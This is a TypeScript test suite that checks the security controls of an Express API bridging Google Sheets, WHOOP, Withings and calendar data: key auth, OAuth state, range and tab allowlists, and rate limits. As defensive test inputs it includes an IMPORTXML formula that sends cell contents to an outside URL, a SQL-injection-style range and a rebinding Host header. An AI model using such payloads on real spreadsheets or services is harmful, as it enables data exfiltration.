import { describe, it, expect } from 'vitest';
import request from 'supertest';
import express from 'express';
import { app } from '../src/index.js';
import { rateLimit, issueOAuthState, consumeOAuthState, isPublicRoute } from '../src/middleware/security.js';
import { tabAllowed, validRange, validateGrid, isRealDate } from '../src/validation/sheetAccess.js';

const KEY = 'test-bridge-key-0123456789abcdef0123456789abcdef';
const authed = (r: request.Test) => r.set('X-Bridge-Key', KEY);

describe('Bridge auth on every endpoint (item 11)', () => {
  const cases: Array<[string, string]> = [
    ['get', '/coaching/sheets'],
    ['get', '/coaching/sheets/WORKOUT_DATABASE/data'],
    ['get', '/whoop/today'],
    ['get', '/withings/summary'],
    ['get', '/calendar/today'],
    ['get', '/auth/whoop/status'],
    ['post', '/auth/whoop/revoke'],
    ['delete', '/coaching/sheets/Goals'],
  ];
  for (const [method, url] of cases) {
    it(`${method.toUpperCase()} ${url} without a key -> 401 UNAUTHORIZED`, async () => {
      const res = await (request(app) as any)[method](url);
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });
  }
  it('rejects a wrong key', async () => {
    const res = await request(app).get('/whoop/today').set('X-Bridge-Key', 'nope');
    expect(res.body.error.code).toBe('UNAUTHORIZED');
  });
  it('a valid key passes the gate (then hits provider auth, not the key check)', async () => {
    const res = await authed(request(app).get('/whoop/today'));
    expect(res.status).toBe(401);
    expect(res.body.error.code).toBe('NOT_AUTHENTICATED');
  });
  it('human-opened OAuth pages and /health stay reachable without a key', async () => {
    expect((await request(app).get('/health')).status).toBe(200);
    const start = await request(app).get('/auth/whoop/start');
    expect(start.status).toBe(200);
    expect(start.text).toMatch(/state=[0-9a-f]{48}/);
    expect(isPublicRoute('POST', '/auth/whoop/callback')).toBe(false);
  });
  it('rejects a DNS-rebinding Host header', async () => {
    const res = await authed(request(app).get('/health').set('Host', 'evil.example:3000'));
    expect(res.status).toBe(421);
  });
});

describe('OAuth state (CSRF on the public callbacks)', () => {
  it('callback without our state -> 400 INVALID_STATE (no token exchange attempted)', async () => {
    const res = await request(app).get('/auth/whoop/callback?code=abc&state=forged');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('INVALID_STATE');
  });
  it('state is single-use and provider-bound', () => {
    const s = issueOAuthState('withings');
    expect(consumeOAuthState('whoop', s)).toBe(false);
    const t = issueOAuthState('withings');
    expect(consumeOAuthState('withings', t)).toBe(true);
    expect(consumeOAuthState('withings', t)).toBe(false); // replay
  });
});

describe('Sheet tab / range / data validation', () => {
  it('blocks reads of tabs outside the allowlist', async () => {
    const res = await authed(request(app).get('/coaching/sheets/Sheet6/data'));
    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe('TAB_NOT_ALLOWED');
  });
  it('blocks a range that switches tabs ("Goals!A1:Z")', async () => {
    const res = await authed(request(app).get('/coaching/sheets/WORKOUT_DATABASE/data').query({ range: 'Goals!A1:Z' }));
    expect(res.status).toBe(400);
  });
  it('allowed tab + valid range passes validation (stops at Google auth)', async () => {
    const res = await authed(request(app).get('/coaching/sheets/WORKOUT_DATABASE/data').query({ range: 'A1:M20' }));
    expect(res.body.error.code).toBe('NOT_AUTHENTICATED');
  });
  it('blocks writes to read-only tabs and formula injection', async () => {
    const goals = await authed(request(app).post('/coaching/sheets/Goals/append').send({ data: [['x']] }));
    expect(goals.status).toBe(403);
    const formula = await authed(
      request(app)
        .put('/coaching/sheets/WORKOUT_DATABASE/range')
        .send({ range: 'H5', data: [['=IMPORTXML("https://x/?d="&A1,"//a")']] }),
    );
    expect(formula.status).toBe(400);
    expect(formula.body.error.message).toMatch(/formulas/);
  });
  it('update_sheet_range requires a range and a well-formed 2D array', async () => {
    const noRange = await authed(request(app).put('/coaching/sheets/WORKOUT_DATABASE/range').send({ data: [[1]] }));
    expect(noRange.status).toBe(400);
    const flat = await authed(request(app).put('/coaching/sheets/WORKOUT_DATABASE/range').send({ range: 'A1', data: [1, 2] }));
    expect(flat.status).toBe(400);
  });
  it('tab deletion is limited to Workout_<date> sheets', async () => {
    expect((await authed(request(app).delete('/coaching/sheets/WORKOUT_DATABASE'))).status).toBe(403);
    expect(tabAllowed('Workout_2026-10-16', 'delete')).toBe(true);
  });
  it('rejects invalid workout dates', async () => {
    expect((await authed(request(app).get('/coaching/workout/2026-13-45'))).status).toBe(400);
  });
  it('unit: ranges, grids, dates, tabs', () => {
    for (const ok of ['A1', 'A1:H20', 'G136', 'A:A', 'A1:M5000', '$A$1:$B$2']) expect(validRange(ok)).toBe(true);
    for (const bad of ['Goals!A1', 'A1:B2:C3', '', 'A0', "A1'; DROP", 'AAAA1']) expect(validRange(bad)).toBe(false);
    expect(validateGrid([[1, 'a', true, null]])).toBeNull();
    expect(validateGrid([[{}]])).toMatch(/cells/);
    expect(validateGrid([[NaN]])).toMatch(/finite/);
    expect(isRealDate('2026-02-29')).toBe(false);
    expect(isRealDate('2028-02-29')).toBe(true);
    expect(tabAllowed('Workout_2026-02-24_Back', 'read')).toBe(true);
    expect(tabAllowed('API-Check', 'read')).toBe(false);
    expect(tabAllowed('NUTRITION_LOG', 'create')).toBe(true);
    expect(tabAllowed('Goals', 'create')).toBe(false);
  });
});

describe('Calendar input validation', () => {
  it('rejects a malformed event id with 400', async () => {
    const res = await authed(request(app).delete('/calendar/events/bad%20id!'));
    expect(res.status).toBe(400);
  });
});

describe('Rate limiting', () => {
  it('returns 429 with Retry-After past the per-window cap', async () => {
    const mini = express();
    mini.use(rateLimit({ windowMs: 60_000, max: 3 }));
    mini.get('/x', (_req, res) => {
      res.json({ ok: true });
    });
    for (let i = 0; i < 3; i++) expect((await request(mini).get('/x')).status).toBe(200);
    const r = await request(mini).get('/x');
    expect(r.status).toBe(429);
    expect(Number(r.headers['retry-after'])).toBeGreaterThan(0);
  });
});
